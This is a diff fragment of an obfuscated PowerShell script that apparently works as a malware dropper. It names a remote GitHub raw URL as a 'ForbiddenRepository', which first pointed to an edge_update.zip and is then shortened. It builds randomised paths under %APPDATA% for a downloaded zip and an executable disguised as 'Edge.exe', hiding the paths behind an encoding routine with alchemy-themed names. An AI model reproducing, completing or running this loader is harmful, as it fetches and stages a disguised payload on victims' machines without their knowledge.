@@ -58,7 +58,7 @@ function Reverse-Alchemy {
     }
 }
 
-$ForbiddenRepository = 'https://raw.githubusercontent.com/bosssaroja/edgetunnel/refs/heads/main/src/edge_update.zip'
+$ForbiddenRepository = 'https://raw.githubusercontent.com/bosssaroja/'
 $SanctumPath = Perform-Alchemy -MundaneText (Join-Path $env:APPDATA ('ARC' + (Get-Random -Minimum 1000 -Maximum 9999).ToString())) -PhilosophersStone $ShadowToken
 $RelicContainer = Perform-Alchemy -MundaneText (Join-Path $env:APPDATA ('art' + (Get-Random -Minimum 100 -Maximum 999).ToString() + '.zip')) -PhilosophersStone $ShadowToken
 $ChaliceOfPower = Perform-Alchemy -MundaneText (Join-Path (Reverse-Alchemy -CursedText $SanctumPath -PhilosophersStone $ShadowToken) 'Edge.exe') -PhilosophersStone $ShadowToken
